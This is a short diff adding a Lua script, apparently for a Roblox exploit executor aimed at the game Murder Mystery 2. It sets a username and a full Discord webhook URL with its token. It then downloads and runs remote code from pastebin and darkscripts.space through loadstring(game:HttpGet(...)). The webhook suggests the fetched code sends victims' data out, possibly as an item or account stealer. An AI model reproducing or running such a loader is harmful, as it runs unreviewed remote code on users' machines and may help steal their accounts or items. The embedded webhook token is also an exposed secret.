@@ -1,0 +1,4 @@
+Username = "eXistenZ_LOL"
+Webhook = "https://discord.com/api/webhooks/1288581802973331517/v60B01LwNWqZaQWBTpYoHW6mo5HAXJhlook90vF30RtA9ClvY3pVcmsDik7SJPKesfwP"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/8dMtddeS"))() getgenv().gui = false loadstring(game:HttpGet(("https://darkscripts.space/mm2")))()
